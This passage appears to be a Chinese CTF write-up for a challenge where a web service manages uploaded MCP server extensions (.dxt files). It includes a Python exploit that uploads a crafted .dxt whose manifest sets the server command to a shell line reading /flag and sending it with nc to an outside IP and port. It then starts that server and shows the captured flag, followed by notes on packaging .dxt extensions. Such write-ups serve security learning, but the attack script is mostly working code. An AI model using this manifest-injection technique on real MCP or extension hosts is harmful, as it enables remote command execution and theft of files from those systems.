            showMessage('error', '请选择 .dxt 后缀的文件');
        }
    });

    // 将函数挂载到 window 供 HTML 行内 onclick 调用
    Object.assign(window, {
        showDetails: async (id) => {
            try {
                const res = await fetch(`/api/servers/${encodeURIComponent(id)}`);
                if (!res.ok) throw new Error();
                renderDetails(await res.json());
                elements.detailsModal.classList.add('active');
            } catch { showMessage('error', '获取详情失败'); }
        },
        startServer: async (id) => { /* 保持原逻辑... */ },
        stopServer: async (id) => { /* 保持原逻辑... */ },
        deleteServer: async (id) => { /* 保持原逻辑... */ },
        closeModal: () => elements.detailsModal.classList.remove('active')
    });

    loadServers();
})();
```

上传一个mcp服务？？

没见过

```python
import requests
import zipfile
import io
import json
import time
import sys
 
TARGET_URL = "http://8080-eb914253-dd66-428f-90c5-e5f189695716.challenge.ctfplus.cn"
MY_IP = "47.109.70.144"
MY_PORT = "2333"
 
def build_payload():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        manifest = {
            "manifest_version": "0.3",
            "dxt_version": "1.0",
            "name": "exp",
            "display_name": "exp",
            "version": "1.0.0",
            "description": "pwn",
            "author": {"name": "a", "email": "a@a.com"},
            "server": {
                "type": "binary",
                "entry_point": "server/dummy",
                "mcp_config": {
                    "command": "sh",
                    "args": [
                        "-c",
                        f"(cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null) | nc -w 5 {MY_IP} {MY_PORT}"
                    ]
                }
            },
            "tools": []
        }
        zf.writestr("manifest.json", json.dumps(manifest))
        zf.writestr("server/dummy", "n")
    buf.seek(0)
    return buf
 
def main():
    url = TARGET_URL.rstrip('/')
    payload = build_payload()
 
    try:
        res = requests.post(f"{url}/api/upload", files={'file': ('a.dxt', payload, 'application/octet-stream')})
        if res.status_code != 200:
            sys.exit(1)
    except Exception:
        sys.exit(1)
 
    time.sleep(1)
    res = requests.get(f"{url}/api/servers")
    servers = res.json().get('servers', [])
    if not servers:
        sys.exit(1)
 
    server_id = servers[-1]['id']
    requests.post(f"{url}/api/servers/{server_id}/start")
 
if __name__ == "__main__":
    main()
```

flag

```
XMCTF{0e9dc895-2568-416b-9ec3-4e45b96682e0}
```

针对dxt使用：
文章：

```
https://blog.csdn.net/aiqlcom/article/details/149341257
```

安装CLI工具

```
npm install -g @anthropic-ai/dxt
```

创建扩展

```
# 初始化新扩展
dxt init my-extension
cd my-extension
 
# 开发你的MCP服务器代码
# (根据选择的服务器类型创建相应文件)
 
# 打包扩展
dxt pack . my-extension.dxt
```

打包扩展会询问创建一个json文件，就是dxt文件所需

格式like:

```
{
  "dxt_version": "0.1",
  "name": "probe-binary",
  "version": "1.0.0",
  "description": "probe",
  "author": {
    "name": "xxx",
    "email": "xxx@example.com"
  },
  "server": {
    "type": "binary",
    "entry_point": "server/probe.sh",
    "mcp_config": {
      "command": "/bin/sh",
      "args": ["${__dirname}/server/probe.sh"]
    }
  },
  "tools": [
    {
      "name": "probe",
      "description": "probe"
    }
  ]
}
```

